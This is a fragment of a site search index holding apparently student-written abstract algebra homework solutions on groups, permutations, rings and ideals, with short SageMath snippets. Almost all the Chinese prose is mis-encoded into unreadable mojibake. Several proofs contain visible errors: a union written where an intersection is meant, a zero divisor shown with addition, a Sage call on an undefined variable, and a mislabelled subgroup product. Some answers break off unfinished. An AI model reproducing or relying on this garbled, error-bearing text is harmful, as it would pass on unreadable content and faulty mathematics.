g^{-1},k^{-1} \\in G$$ï¼Œå› æ­¤ $$\\forall g, k \\in G \\Rightarrow (g \\cdot k) H = (k \\cdot g)H$$ï¼Œå› æ­¤å•†ç¾¤æ˜¯é˜¿è´å°”ç¾¤ã€‚\n  20 #  æˆ‘ä»¬è€ƒè™‘ $$h^{-1}k^{-1}hk$$ï¼š\n å› ä¸º H æ˜¯æ­£è§„å­ç¾¤ï¼Œé‚£ä¹ˆå¿…ç„¶ä¼šæœ‰ $$k^{-1}hk \\in H$$ï¼Œå› æ­¤ $$h^{-1}(k^{-1}hk) \\in H$$ å› ä¸º K æ˜¯æ­£è§„å­ç¾¤ï¼Œé‚£ä¹ˆå¿…ç„¶ä¼šæœ‰ $$h^{-1}k^{-1}h \\in H$$ï¼Œå› æ­¤ $$(h^{-1}k^{-1}h)k \\in K$$  äºæ˜¯ï¼Œ$$h^{-1}k^{-1}hk \\in H \\cup K = {1} \\Rightarrow h^{-1}k^{-1}hk = 1 \\Rightarrow hk = kh$$\n21 #  æ‰­å…ƒæ„æˆçš„é›†åˆï¼š\n  å°é—­æ€§ï¼šå¯¹äº $$\\forall g_1, g_2 \\in G_{tor}, g_1^{n_1}, g_2^{n_2} = e$$ï¼š$$\\exist n = n_1 n_2, (g_1g_2)^{n} = (g_1^{n_1})^{n_2} (g_2^{n_2})^{n_1} = e \\Rightarrow g_1g_2 \\in G_{tor}$$\n  ç»“åˆå¾‹ï¼šå› ä¸ºäºŒå…ƒè¿ç®—åœ¨ G ä¸Šæ˜¯ç»“åˆçš„ï¼Œæ‰€ä»¥åœ¨å…¶å­é›†ä¸­æ˜¯å¿…ç„¶æ˜¯ç»“åˆçš„\n  å­˜åœ¨å¹ºå…ƒï¼šå¾ˆæ˜¾ç„¶\n  å­˜åœ¨é€†å…ƒï¼šå¯¹äº $$\\forall g \\in G_{tor}, g^n = e \\Rightarrow g^{-1} = g^{n-1} \\Rightarrow g^{-1} \\in G_{tor}$$\n  æ‰€ä»¥è¿™ä¸ªæ‰­å…ƒæ„æˆçš„é›†åˆæ˜¯ä¸€ä¸ªç¾¤ï¼Œåˆå› ä¸º G æ˜¯ä¸€ä¸ªäº¤æ¢ç¾¤ï¼Œæ‰€ä»¥æ‰­å…ƒæ„æˆçš„é›†åˆå¿…ç„¶æ˜¯ G çš„ä¸€ä¸ªæ­£è§„å­ç¾¤ã€‚\n22 #  è®¾ç”± H ç¡®å®šçš„ G ä¸Šçš„å·¦é™ªé›†å…³ç³»æ„æˆçš„å•†é›†æ˜¯ $${H, aH}$$\nå¯¹äº $$\\forall h \\in H, g \\in G$$ï¼š\n è‹¥ $$g \\in H$$ï¼Œå› ä¸º H æ˜¯ä¸€ä¸ªç¾¤ï¼Œå› æ­¤å¿…ç„¶æœ‰ $$g h g^{-1} \\in H$$ è‹¥ $$g \\in aH, \\exist h\u0026rsquo; \\in H, g = ah\u0026rsquo;$$ï¼Œæˆ‘ä»¬ç”¨åè¯æ³•ï¼š  è‹¥ H ä¸æ˜¯ G çš„æ­£è§„å­ç¾¤ï¼Œé‚£ä¹ˆå¿…ç„¶æœ‰ $$ghg^{-1} \\in aH \\Rightarrow \\exist h\u0026rsquo;\u0026rsquo; \\in H, ghg^{-1} = ah\u0026rsquo;\u0026rsquo;$$ï¼Œä»è€Œæˆ‘ä»¬æœ‰ï¼š $$ah\u0026rsquo; h (h\u0026rsquo;)^{-1}a^{-1} = ah\u0026rsquo;\u0026rsquo; \\Rightarrow a = h\u0026rsquo;h(h\u0026rsquo;)^{-1}(h\u0026rsquo;\u0026rsquo;)^{-1} \\in H$$ï¼Œè¿™å¾ˆæ˜¾ç„¶æ˜¯é”™è¯¯çš„ï¼Œæ‰€ä»¥ H æ˜¯ G çš„æ­£è§„å­ç¾¤    23 #  ï¼ˆ1ï¼‰\nå¯¹äº $$H \\times K$$ ä¸Šå®šä¹‰çš„ä¹˜æ³•è¿ç®—ï¼š\n  å°é—­æ€§ï¼šå¯¹äº $$(h_1, k_1), (h_2, k_2) \\in H \\times K$$ï¼Œå› ä¸º H, K æ˜¯ç¾¤ï¼Œå¿…ç„¶æœ‰ $$h_1 h_2 \\in H, k_1k_2 \\in K \\Rightarrow (h_1h_2, k_1k_2) = (h_1, k_1)(h_2,k_2) \\in H \\times K$$\n  ç»“åˆæ€§ï¼šåŒæ ·çš„ï¼Œå› ä¸º H, K æ˜¯ç¾¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™ä¸ªäºŒå…ƒè¿ç®—åœ¨ $$H \\times K$$ æ˜¯ç»“åˆçš„ï¼›\n  å¹ºå…ƒï¼šè®¾ H, K çš„å¹ºå…ƒä¸º $$e_1, e_2$$ï¼Œå› æ­¤å¯¹äº $$H \\times K$$ï¼Œæœ‰å¹ºå…ƒ $$(e_1, e_2)$$ï¼Œè¯æ˜æ˜¯æ˜¾ç„¶çš„ï¼›\n  é€†å…ƒï¼šåŒæ ·çš„ï¼Œå¯¹äº $$(h, k) \\in H \\times K$$ï¼Œæœ‰é€†å…ƒ $$(h^{-1}, k^{-1})$$\n  æ‰€ä»¥ä»£æ•°ç³»ç»Ÿ $$(H \\times K, \\cdot)$$ æ„æˆä¸€ä¸ªç¾¤ã€‚\nï¼ˆ2ï¼‰\nå¯¹äº $$H_1 = {(h, e_1) | h \\in H}$$ï¼š\n é¦–å…ˆè¿™å¾ˆæ˜¾ç„¶æ˜¯ä¸€ä¸ªå­ç¾¤ï¼Œä¸‹é¢è¯æ˜å®ƒæ˜¯æ­£è§„å­ç¾¤ï¼› $$\\forall (h, e_1) \\in H_1, (h\u0026rsquo;, k\u0026rsquo;) \\in H \\times K \\Rightarrow (h\u0026rsquo;, k\u0026rsquo;)^{-1}(h, e_1)(h\u0026rsquo;, k\u0026rsquo;) = ((h\u0026rsquo;)^{-1}hh\u0026rsquo;, e_1) \\in H_1$$  å› æ­¤ $$H_1$$ æ˜¯ä¸€ä¸ªæ­£è§„å­ç¾¤ã€‚åŒç†å¯ä»¥è¯æ˜ $$K_1$$ ä¹Ÿæ˜¯ä¸€ä¸ªæ­£è§„å­ç¾¤ã€‚\nï¼ˆ3ï¼‰\nå¾ˆæ˜¾ç„¶è¿™ä¸ªæ˜¯æ­£ç¡®çš„ï¼š$$H_1 \\cap K_1 = {(e_1, e_2)}$$\nå…³äº $$H \\times K = H_1K_1$$ï¼š\n é¦–å…ˆå¯¹äº $$\\forall (h, k) \\in H \\times K, (h,k) = (e_1, k)(h, e_2)$$ï¼Œæ‰€ä»¥ $$H \\times K \\sub H_1K_1$$ å…¶æ¬¡æˆ‘ä»¬æœ‰ $$\\forall (e_1, k) \\in K_1, (h, e_2) \\in H_1, (h,k) \\in H \\times K$$ï¼Œæ‰€ä»¥ $$H_1K_2 \\sub H \\times K$$  ç»“åˆä¸Šä¸¤å¼æˆ‘ä»¬ä¼šæœ‰ï¼š$$H \\times K = H_1K_1$$\n24 #  ï¼ˆ1ï¼‰\nä¸æ˜¯ï¼šå– $$1.6, 1.6 \\in \\R$$ï¼Œ$$f(1.6 + 1.6) = f(3.2) = 3, f(1.6) + f(1.6) = 2 \\Rightarrow 2, 3 \\in \\Z \\and 2 \\not= 3$$\nï¼ˆ2ï¼‰\næ˜¯ã€‚æ˜¾ç„¶ï¼š$$|x| \\cdot |y| = |x \\cdot y|$$ã€‚ä¸‹é¢æ±‚æ ¸ï¼š\n$$ker\\ f = {a | a \\in \\R^* \\and f(a) = e_{\\R^+}} = {a | a \\in \\R^* \\and |a| = 1} = {1, -1}$$\nï¼ˆ3ï¼‰\nä¸æ˜¯ã€‚å– $$3, 3 \\in \\Z_5, f(3 +{mod5} 3) = 1,f(3) +{mod2} f(3) = 0 \\Rightarrow 1 \\not= 0$$\n25 #  å¯¹äºè‡ªåŒæ„é›†åˆ AutGï¼Œæœ‰ $$\\forall f_1, f_2 \\in AutG$$ï¼ŒäºŒè€…éƒ½æ˜¯ G ä¸Šçš„åŒå°„ã€‚æˆ‘ä»¬è€ƒè™‘å‡½æ•°çš„å¤åˆ $$\\circ$$ï¼š\n å°é—­æ€§ï¼šå› ä¸º $$f_1, f_2$$ æ˜¯åŒå°„ï¼Œ$$f_1 \\circ f_2$$ å¿…ç„¶ä¹Ÿæ˜¯åŒå°„ï¼Œ$$f_1, f_2$$ çš„å®šä¹‰åŸŸå€¼åŸŸå‡ç›¸ç­‰ï¼Œå¿…ç„¶ä¹Ÿæ˜¯ $$f_1 \\circ f_2$$ çš„å®šä¹‰åŸŸå€¼åŸŸï¼Œå› æ­¤ $$f_1 \\circ f_2$$ ä¹Ÿæ˜¯ AutG çš„è‡ªåŒæ„ï¼› ç»“åˆæ€§ï¼šå‡½æ•°çš„å¤åˆæ»¡è¶³ç»“åˆå¾‹ï¼› å­˜åœ¨å¹ºå…ƒï¼šå­˜åœ¨ $$e = x \\rightarrow x$$ï¼Œä¸ºè¿™ä¸ªä»£æ•°ç³»ç»Ÿçš„å¹ºå…ƒï¼› å­˜åœ¨é€†å…ƒï¼šf(x) å­˜åœ¨é€†å…ƒ $$f^{-1}(x)$$  å› æ­¤ $$(AutG, \\circ)$$ æ˜¯ä¸€ä¸ªç¾¤ã€‚\n26 #  ï¼ˆ1ï¼‰\n$$g \\rightarrow g^{-1} \\text{æ˜¯ G çš„è‡ªåŒæ„} \\Leftrightarrow f(g_1 g_2) = f(g_1)f(g_2) \\Leftrightarrow g_2^{-1} g_1^{-1} = g_1^{-1}g_2^{-1} \\Leftrightarrow \\text{G æ˜¯é˜¿è´å°”ç¾¤}$$\nï¼ˆ2ï¼‰\nè€ƒè™‘ $$\\displaystyle f(g_1 g_2) = (g_1g_2)^k \\overset{\\text{G æ˜¯é˜¿è´å°”ç¾¤}}{=} g_1^k g_2^k = f(g_1)f(g_2)$$\nå› æ­¤ f æ˜¯ G çš„è‡ªåŒæ€ã€‚\n27 #  å…ˆåšä»¥ä¸‹çš„å‡½æ•°ï¼š$$f(x) = \\begin{cases}1 \u0026amp; x =a \\ 2 \u0026amp; x = b \\ 3 \u0026amp; x = c \\end{cases}$$ï¼Œ\nè€ƒè™‘æ˜ å°„ $$g: ([e, x_1, x_2, x_3] \\rightarrow [e, y_1, y_2, y_3]) \\rightarrow \\begin{pmatrix} f(x_1) \u0026amp; f(x_2) \u0026amp; f(x_3) \\ f(y_1) \u0026amp; f(y_2) \u0026amp; f(y_3) \\end{pmatrix}$$\ng æ˜¯ä¸€ä¸ªä»å››å…ƒç¾¤ K çš„è‡ªåŒæ„ç¾¤æ˜ å°„åˆ° $$S_3$$ çš„åŒå°„ï¼Œå› æ­¤äºŒè€…åŒæ„ã€‚\n28 #  ç›´æ¥åˆ†è§£ï¼š\n$$\\displaystyle \\begin{pmatrix}1 \u0026amp; 2 \u0026amp; 3 \u0026amp; 4 \u0026amp; 5 \u0026amp; 6 \u0026amp; 7 \u0026amp; 8 \\ 2 \u0026amp; 5 \u0026amp; 6 \u0026amp; 8 \u0026amp; 1 \u0026amp; 4 \u0026amp; 7 \u0026amp; 3 \\end{pmatrix} = (2\\ 5\\ 1)(1\\ 2\\ 6\\ 8\\ 5\\ 4\\ 7\\ 3) = (2\\ 5\\ 1)(6\\ 4\\ 8\\ 3)(1\\ 2\\ 3\\ 4\\ 5\\ 6\\ 7\\ 8) = (2\\ 5\\ 1)(6\\ 4\\ 8\\ 3)(7)$$\næˆ–è€…ç”¨ sageï¼š\n#!/usr/bin/env sage  p = Permutation([2,5,6,8,1,4,7,3,])\t# å»ºç«‹é¢˜ç›®ä¸­ç»™çš„ç½®æ¢ (permutation) p.to_cycles()\t# å°†è¿™ä¸ªç½®æ¢è½¬åŒ–ä¸ºè½®æ¢ (cycle) # [(1, 2, 5), (3, 6, 4, 8), (7,)] 29 #  #!/usr/bin/env sage  p1 = Permutation([2, 5, 6, 8, 1, 4, 7, 3]) p2 = Permutation([2, 5, 6, 4, 1, 8, 7, 3])\t# å»ºç«‹é¢˜ç›®ä¸­ç»™çš„ä¸¤ä¸ªç½®æ¢ (permutation) p = p1*p2\t# å¤åˆè¿™ä¸¤ä¸ªç½®æ¢ (multiplication) print(p) # [5, 1, 8, 3, 2, 4, 7, 6] p.to_cycles()\t# å°†å¤åˆçš„ç½®æ¢è½¬åŒ–ä¸ºè½®æ¢ (cycle) # [(1, 5, 2), (3, 8, 6, 4), (7,)] å³ $$(1\\ 5\\ 2) \\circ (3\\ 8\\ 6\\ 4) \\circ (7)$$\n30 #  #!/usr/bin/env sage sigma = Permutation([2, 3, 1, 5, 4]) tau = Permutation([3, 4, 1, 5, 2])  print(sigma * tau)\t# [4, 1, 3, 2, 5] print(sigma.inverse() * tau * sigma)\t# [2, 1, 5, 3, 4] print(sigma * sigma)\t# [2, 1, 5, 3, 4] print(sigma * sigma * sigma)\t# [1, 2, 3, 5, 4] "},{"id":240,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.2/","title":"4.2","section":"HOMEWORK","content":"4.2 äº¤æ¢ç¯ä¸åŸŸ #  è¯æ˜é¢˜ #  1 #  å¯¹äºåŠ æ³•è¿ç®—ï¼šåœ¨ 4.1 çš„ç¬¬ 3 é¢˜ä¸­å·²ç»è¯æ˜ $$(\\Z \\times \\Z, +)$$ æ˜¯ä¸€ä¸ªç¾¤ï¼Œäº¤æ¢å¾‹ä¹Ÿæ˜¾ç„¶å¯ä»¥è¯æ˜ï¼›\nå¯¹äºä¹˜æ³•è¿ç®—ï¼šå› ä¸º $$(\\Z, \\cdot)$$ æ„æˆä¸€ä¸ªäº¤æ¢ç¾¤ï¼Œæ˜¾ç„¶æ˜¯æ»¡è¶³ç»“åˆç‡ã€å­˜åœ¨å¹ºå…ƒå’Œäº¤æ¢ç‡çš„ã€‚\nå­˜åœ¨é›¶å› å­ $$(a, 0), (0,b) \\Rightarrow (a, 0) + (b, 0) = (0, 0)$$\nç»¼ä¸Šæ‰€è¿°ï¼Œ$$(\\Z \\times \\Z, +)$$ æ˜¯ä¸€ä¸ªæœ‰é›¶å› å­çš„äº¤æ¢ç¯ã€‚\n2 #  å¯¹äºé«˜æ–¯æ•´ç¯ $$\\Z[i] = {a + b i | a, b \\in \\Z}$$ ä¸Šçš„ä»»æ„å…ƒç´  $$a + bi$$ï¼Œå¦‚æœå®ƒå­˜åœ¨é€†å…ƒï¼š\nå³æ±‚ $$(a + bi) (c + di) = 1$$ å…³äº c,d çš„è§£ã€‚\n$$\\displaystyle ac - bd + (ad + bc)i = 1 \\Rightarrow \\begin{cases} ac - bd = 1 \\ ad + bc = 0 \\end{cases}\\Rightarrow a^2 c + b^2c = a \\Rightarrow (a^2 + b^2)c = a$$\nåˆ†æƒ…å†µè®¨è®ºï¼š\n è‹¥ a \u0026gt; 1 æˆ– a \u0026lt; -1ï¼Œå› ä¸º $$a \\in \\Z$$ï¼Œå¿…ç„¶æœ‰ $$a^2 + b^2 \u0026gt; |a|$$ï¼Œæ‰€ä»¥ $$(a^2 + b^2) c = a$$ ä¸å¯èƒ½æˆç«‹ï¼› è‹¥ $$a = \\pm 1 \\Rightarrow b = 0, c = \\pm 1$$ï¼Œåˆ™æ­¤æ—¶ $$a + bi = \\pm 1$$ è‹¥ $$a = 0 \\Rightarrow c = 0 \\Rightarrow bd = -1 \\Rightarrow b = \\pm 1$$ï¼Œåˆ™æ­¤æ—¶ $$a + bi = \\pm i$$  3 #  åŒå‰ä¸€é¢˜ï¼Œå³æ±‚ $$(a + b \\sqrt{2} )(c + d \\sqrt{2}) = 1$$ çš„è§£ã€‚\n$$\\displaystyle ac + 2bd + (ad + bc) \\sqrt{2} = 1 \\Rightarrow \\begin{cases} ac + 2bd = 1 \\ ad+bc = 0 \\end{cases} \\Rightarrow a^2c + 2 b^2 c = a \\Rightarrow (a^2 +2b^2)c = a$$\nåŒæ ·åˆ†æƒ…å†µè®¨è®ºï¼Œå¯ä»¥å¾—åˆ° $$a = \\pm1, 0$$ï¼Œè€Œå½“ a = 0 æ—¶ï¼Œæ˜¯æ— è§£çš„ï¼Œå› æ­¤ $$a + b i = \\pm1$$ æ—¶å¯é€†ã€‚\n4 #  ä½¿ç”¨ sagemath å¯¹å‡ ä¸ªæ•°è¿›è¡Œç´ å…ƒç´ åˆ†è§£ï¼š\n#!/usr/bin/env sage ZZI.\u0026lt;I\u0026gt; = GaussianIntegers() print(ZZI) # Gaussian Integers in Number Field in I with defining polynomial x^2 + 1  print( factor(ZZI(2)), factor(ZZI(3)), factor(ZZI(5)), factor(ZZI(y)) ) # ((-I) * (I + 1)^2, 3, (I) * (-I - 2) * (2*I + 1), 7) ä¹Ÿå°±æ˜¯è¯´ï¼š$$2 = -i \\cdot(i + 1)^2, 3 = 3, 5 = i \\cdot (-i -2) \\cdot(2 \\cdot i + 1), 7 = 7$$\n5 #  å……åˆ†æ€§ï¼š\n å½“ $$\\Z_m$$ ä¸ºæ•´ç¯æ—¶ï¼Œè‹¥ m ä¸æ˜¯ç´ æ•°ï¼Œå¿…ç„¶æœ‰è¿™æ ·çš„ä¸¤ä¸ªå…ƒç´  $$\\exist a, b \\not= 1 \\Rightarrow m = a \\cdot b$$ é‚£ä¹ˆè€ƒè™‘åœ¨ $$\\Z_m$$ ä¸­ï¼Œæœ‰ï¼š$$\\exist a \\Rightarrow \\exist b, s.t. a \\cdot b \\equiv 0 \\pmod{m}$$ï¼Œa æ˜¯é›¶å…ƒï¼Œé‚£ä¹ˆ $$\\Z_m$$ ä¸æ˜¯æ•´ç¯ï¼Œè¿™æ˜¯çŸ›ç›¾çš„ã€‚  å¿…è¦æ€§ï¼š\n å½“ m æ˜¯ç´ æ•°ï¼Œ$$\\Z_m$$ ä¸ä¸ºæ•´ç¯æ—¶ï¼Œå³å­˜åœ¨è¿™æ ·çš„å…ƒç´  $$\\exist a \\Rightarrow \\exist b, a \\cdot b \\equiv 0 \\pmod{m}$$ å¦‚æœ a,b å‡ä¸ä¸ºå¹ºå…ƒï¼Œé‚£ä¹ˆå¿…æœ‰ $$a \\cdot b = k \\cdot m$$ï¼Œè€Œ m æ˜¯ç´ æ•°ï¼Œåˆ™æœ‰ $$m | a$$ æˆ– $$m | b$$ï¼Œé‚£ä¹ˆåœ¨ $$\\Z_m$$ å†…ï¼Œåˆ™å¯ä»¥å¾—åˆ° $$a = 0 \\or b = 0$$ï¼Œè¿™æ˜¯æ¡ä»¶æ˜¯çŸ›ç›¾çš„  6 #  å¯¹äº $$\\Q(\\sqrt{2})$$ ä¸­çš„å…ƒç´ ï¼Œå¯ä»¥è¡¨ç¤ºæˆä¸º $$\\displaystyle \\frac{t}{s} + \\frac{q}{p}\\sqrt{2}$$ï¼Œæˆ‘ä»¬åœ¨åé¢ç”¨ m,n è¡¨ç¤ºæœ‰ç†æ•°ã€‚\nå› ä¸º $$(\\Q, +)$$ æ„æˆä¸€ä¸ªäº¤æ¢ç¾¤ï¼Œæˆ‘ä»¬å®¹æ˜“è¯æ˜ $$(\\Q(\\sqrt{2}), +)$$ ä¹Ÿæ„æˆä¸€ä¸ªäº¤æ¢ç¾¤ã€‚\nå¦å¤–æˆ‘ä»¬è€ƒè™‘ $$(\\Q(\\sqrt{2}), \\cdot)$$ ä»£æ•°ç³»ç»Ÿï¼šå°é—­æ€§ã€ç»“åˆç‡ã€é›¶å…ƒã€äº¤æ¢ç‡éƒ½æ˜¯æ»¡è¶³çš„ã€‚\næˆ‘ä»¬è€ƒè™‘åŠ æ³•å¯¹ä¹˜æ³•çš„åˆ†é…ç‡ï¼š\n $$\\displaystyle (m_1 + n_1 \\sqrt{2}) \\cdot (m_2 + n_2 \\sqrt{2} + m_3 + n_3 \\sqrt{2}) = (m_1m_2 + m_1m_3 + 2n_1n_2 + 2n_1n_3) + (n_1m_2 + n_1m_3 + m_1n_2 + m_1 n_3) \\sqrt{2}$$ $$(m_1 + n_1 \\sqrt{2})(m_2 + n_2 \\sqrt{2}) + (m_1 + n_1\\sqrt{2})(m_3 + n_3\\sqrt{2}) = (m_1m_2 + m_1m_3 + 2n_1n_2 + 2n_1n_3) + (n_1m_2 + n_1m_3 + m_1n_2 + m_1 n_3) \\sqrt{2}$$  æ‰€ä»¥åŠ æ³•å¯¹ä¹˜æ³•æ»¡è¶³åˆ†é…ç‡ã€‚$$\\Q(\\sqrt{2})$$ æ˜¯ä¸€ä¸ªäº¤æ¢ç¯ã€‚\næˆ‘ä»¬è€ƒè™‘æ˜¯å¦å­˜åœ¨é›¶å› å­ï¼š\n è‹¥å­˜åœ¨ï¼š$$(m_1 + n_1 \\sqrt{2})(m_2 + n_2 \\sqrt{2}) = 0 \\Rightarrow m_1m_2 + 2n_1n_2 + (m_1 n_2 + m_2 n_1) \\sqrt{2} = 0$$ åˆ™æˆ‘ä»¬å¾—åˆ°æ–¹ç¨‹ç»„ $$\\begin{cases} m_1m_2 + 2n_1n_2 = 0 \\ m_1n_2 + m_2n_1 = 0\\end{cases} \\Rightarrow -2 n_1n_2^2 + m_2^2n_1 = 0$$ åˆ†æä¹‹å $$n_1 = 0 \\or 2n_2^2 = m_2^2$$ï¼Œå› ä¸ºè¿™å››ä¸ªæ•°éƒ½æ˜¯æœ‰ç†æ•°ï¼Œæ‰€ä»¥ $$\\displaystyle \\frac{m_2}{n_2}$$ å¿…ç„¶ä¹Ÿæ˜¯æœ‰ç†æ•°ï¼Œè€Œæœ‰ç†æ•°çš„å¹³æ–¹ä¸ä¼šç­‰äº 2ï¼Œå› æ­¤åè€…æ˜¯ä¸æˆç«‹çš„ï¼Œæˆ‘ä»¬æ¨å‡º $$n_1 = 0$$ã€‚ å›åˆ°ä¹‹å‰çš„æ¨è®ºï¼Œæœ‰ $$m_1m_2 = 0 \\and m_1n_2 = 0 \\Rightarrow m_1 = 0 \\or (m_2 = n_2 = 0)$$ï¼Œå› æ­¤æœ€åˆçš„ $$\\Q(\\sqrt{2})$$ ä¸­å¿…ç„¶æœ‰ä¸€ä¸ªé›¶å…ƒï¼Œè€Œè¿™æ˜¯ä¸å‡è®¾çŸ›ç›¾çš„ã€‚å› æ­¤åŸäº¤æ¢ç¯ä¸­ä¸å­˜åœ¨é›¶å› å­ï¼Œæ˜¯ä¸€ä¸ªæ•´ç¯ã€‚  åŒæ ·çš„æˆ‘ä»¬è€ƒè™‘é€†å…ƒï¼š\n å› ä¸ºå¹ºå…ƒæ˜¯ 1ï¼Œæˆ‘ä»¬åŒä¸Šé¢çš„åˆ†ææ–¹æ³•ç±»æ¯”åˆ†æå¾—åˆ°æ–¹ç¨‹ç»„ï¼š$$\\begin{cases} m_1m_2 + 2n_1n_2 = 1 \\ m_1n_2 + m_2n_1 = 0 \\end{cases}$$ å¯¹äºç»™å®šçš„ $$m_1, n_1$$ï¼Œåªéœ€è¦è¯æ˜ä¸Šè¿°æ–¹ç¨‹å¯¹äº $$m_2, n_2$$ æœ‰è§£å³å¯ï¼Œå¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸€ä¸ªå…³äº $$m_2, n_2$$ çš„çº¿æ€§æ–¹ç¨‹ç»„ è€ƒè™‘ç³»æ•°çŸ©é˜µï¼š$$\\begin{pmatrix} m_1 \u0026amp; 2n_1 \\ n_1 \u0026amp; m_1 \\end{pmatrix}$$ï¼Œå› ä¸ºäºŒè€…éƒ½ä¸ºæœ‰ç†æ•°ï¼Œå› æ­¤è¿™ä¸ªçŸ©é˜µçš„è¡Œåˆ—å¼ä¸ä¸ºé›¶ï¼ŒåŸæ–¹ç¨‹ç»„å¿…æœ‰å”¯ä¸€è§£  å› æ­¤åŸæ•´ç¯ä¹Ÿæ˜¯ä¸€ä¸ªåŸŸã€‚\n7 #  å¯¹äº $$\\forall f(x)= a_n x^n + a_{n-1} x^{n-1} + \\cdots + a_1 x + a_0, g(x)= b_m x^m + b_{m-1} x^{m-1} + \\cdots + b_0$$\næœ‰ $$f(x)g(x) = a_n b_m x^{n+m} + \\cdots + a_0b_0$$\nå› ä¸º $$a_n, b_m \\in R$$ï¼ŒR æ˜¯ä¸€ä¸ªäº¤æ¢æ•´ç¯ï¼ŒR ä¸­æ— é›¶å› å­ï¼Œè€Œ $$a_n, b_m$$ å¿…ç„¶éé›¶å…ƒï¼Œå› æ­¤ $$a_nb_m \\not= 0$$\næ‰€ä»¥ $$\\deg fg = deg f + \\deg g$$\n8 #  è¯æ˜é›†åˆ $$I = {a | a \\in R, \\exist m \\in N \\Rightarrow a^m = 0}$$ æ˜¯ R çš„ç†æƒ³ï¼š\n å¯¹äº 0ï¼Œæ˜¾ç„¶æ˜¯å±äº I çš„ï¼› å¯¹äº $$\\forall a, b \\in I, \\exist m,n \\Rightarrow a^m = b^n = 0$$ï¼Œæˆ‘ä»¬è€ƒè™‘ $$(a+b)^{m+n}$$ï¼Œè€ƒè™‘å…¶åˆ†è§£çš„å•é¡¹å¼çš„å½¢å¼å¿…ç„¶æ»¡è¶³ $$a^s b^t, s \\ge m \\or t \\ge n$$ï¼Œå› æ­¤æœ‰ $$(a+b)^{m+n} = 0 $$ï¼Œåˆ™ $$a + b \\in I$$ å¯¹äº $$\\forall a \\in I \\Rightarrow \\exist m, a^m = 0; \\forall r \\in R$$ï¼Œè€ƒè™‘ arï¼Œæ˜¾ç„¶æœ‰ $$(ar)^m = 0$$ã€‚  ç»¼åˆä»¥ä¸Šçš„è®ºè¿°ï¼ŒI æ˜¯ R çš„ç†æƒ³ã€‚\n9 #  å› ä¸º R æ˜¯äº¤æ¢æ•´ç¯è€Œä¸æ˜¯åŸŸï¼Œå› æ­¤ R ä¸Šå¿…ç„¶å­˜åœ¨ä¸€ä¸ªä¸å¯é€†å…ƒç´ ï¼Œæˆ‘ä»¬è®¾ä¹‹ä¸º aã€‚\nå¦‚æœ R[x] æ˜¯ä¸»ç†æƒ³æ•´ç¯ï¼Œå¿…ç„¶æœ‰ R[x] ä¸Šä¸å­˜åœ¨é›¶å› å­ï¼Œä¸” R[x] ä¸Šçš„æ‰€æœ‰ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³ã€‚\nè€ƒè™‘å­é›† $$H = {a, x^2 + 1}$$ ç”Ÿæˆçš„ç†æƒ³ $$I = \u0026lt;a, x^2 + 1\u0026gt;$$ã€‚æˆ‘ä»¬çŸ¥é“ R æ˜¯ä¸€ä¸ªæ•´ç¯ï¼Œå› æ­¤åè€…çš„å¤šé¡¹å¼ä¸€å®šæ˜¯ä¸å¯çº¦çš„ï¼Œå› æ­¤ $$x^2 + 1$$ ä»…æœ‰å¹³å‡¡å› å­ã€‚è€Œç”±äº I æ˜¯ä¸€ä¸ªä¸»ç†æƒ³ï¼Œå¿…ç„¶å­˜åœ¨ä¸€ä¸ªç”Ÿæˆå…ƒï¼Œè€ƒè™‘ H ä¸­æœ‰ç´ å¤šé¡¹å¼ï¼Œå› æ­¤è¿™ä¸ªç”Ÿæˆå…ƒå¿…ç„¶æ˜¯å¹ºå…ƒ 1ã€‚\nè€Œå› ä¸º a æ˜¯ä¸å¯é€†çš„ï¼Œé‚£ä¹ˆå¹ºå…ƒ 1 å¿…ç„¶ä¸åœ¨ H ç”Ÿæˆçš„ç†æƒ³ä¸­ã€‚è¿™æ˜¯çŸ›ç›¾çš„ï¼Œå› æ­¤ R[x] ä¸æ˜¯ä¸»ç†æƒ³æ•´ç¯ã€‚\n10 #  ï¼ˆ1ï¼‰\n$$\\pi: R \\rightarrow R/I$$\n11 #  è€ƒè™‘æ„é€ å•†ç¯çš„å•†ç¾¤ï¼Œè€ƒè™‘å•†ç¾¤ä¸­çš„ä¸€ä¸ªå…ƒç´ å•†é›† $${a +  | a \\in \\Z[x]}$$ã€‚\nè€ƒè™‘ aï¼Œè®¾ $$a = m_x + k, m_x \\in , k \\in \\Z$$ï¼Œåˆ™å•†é›† $${m_x + k +  | m_x \\in , k \\in \\Z}$$ = $${k +  | k \\in \\Z}$$\nå¾ˆæ˜¾ç„¶è¿™ä¸ªå•†ç¾¤ä¸ $$\\Z$$ å­˜åœ¨ä¸€ä¸€å¯¹åº”å…³ç³»ï¼Œå› æ­¤äºŒè€…åŒæ„ã€‚\n12 #  å³è¯ç†æƒ³çš„äº¤æ˜¯ä»ç†æƒ³ï¼Œæˆ‘ä»¬è®¾ R æœ‰è¿™æ ·ä¸¤ä¸ªç†æƒ³ $$I_1, I_2$$ï¼Œè€ƒè™‘ä»–ä»¬çš„äº¤ $$I_0 = I_1 \\cap I_2$$\n æ˜¾ç„¶ 0 å±äºè¿™ä¸ªäº¤é›†ï¼› ç„¶åè€ƒè™‘é›†åˆè¿ç®—çš„å°é—­æ€§ã€‚å› ä¸ºäºŒè€…éƒ½æ˜¯ç†æƒ³å¯¹äº $$a, b \\in I_0$$ï¼Œåœ¨ä¸¤ä¸ªç†æƒ³ä¸­åˆ†åˆ«è€ƒè™‘æ€§è´¨å¯ä»¥å¾—åˆ° $$a + b \\in I_1, a+b \\in I_2 \\Rightarrow a+b \\in I_0$$ï¼›  15 #  ï¼ˆ1ï¼‰\nè®¾ R ä¸­åŒ…å« K çš„å­ç¯çš„é›†åˆä¸º $$\\Sigma$$ï¼ŒR\u0026rsquo; ä¸­å­ç¯é›†åˆä¸º $$\\Sigma\u0026rsquo;$$\nå¯¹ $$\\forall R_1 \\in \\Sigma \\Rightarrow f(R_1) \\in \\Sigma\u0026rsquo;$$ï¼Œæ‰€ä»¥ f æ˜¯ $$\\Sigma \\rightarrow \\Sigma\u0026rsquo;$$ çš„æ˜ å°„\nç„¶åæˆ‘ä»¬è€ƒè™‘ $$\\forall R_1\u0026rsquo; \\in 